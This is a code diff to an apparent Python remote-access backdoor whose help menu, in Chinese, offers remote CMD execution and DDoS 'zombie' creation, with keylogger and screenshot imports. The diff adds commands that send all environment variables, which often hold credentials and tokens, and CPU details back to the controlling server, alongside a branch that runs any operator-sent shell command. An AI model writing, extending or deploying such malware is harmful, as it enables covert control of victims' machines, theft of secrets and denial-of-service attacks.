@@ -9,6 +9,7 @@ import base64
 import requests
 from mss import mss
 import threading
+import cpuinfo
 import pynput.keyboard
 
 server_ip = "localhost"
@@ -139,6 +140,8 @@ def handle_communication():
                             "<command>             - 執行CMD命令\n"
                             "zombie <ip>           - 創建DDoS殭屍\n"
                             "kill_zombie           - 停止DDoS殭屍\n"
+                            "get_env               - 顯示環境變數\n"
+                            "cpu_info              - 顯示CPU資訊\n"
                             "q                     - 退出")
             send_data(help_details)
         elif command[:2] == "cd" and len(command) > 1:
@@ -207,6 +210,12 @@ def handle_communication():
                 send_data(f"[+] All zombies killed!")
             except:
                 send_data("[!!] Failed to kill zombie!")
+        elif command[:7] == "get_env":
+            env_vars = os.environ
+            send_data(json.dumps(env_vars)) if env_vars else send_data("[!!] No environment variables found!")
+        elif command[:8] == "cpu_info":
+            cpu_info = cpuinfo.get_cpu_info()
+            send_data(json.dumps(cpu_info))
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             response = proc.stdout.read() + proc.stderr.read()
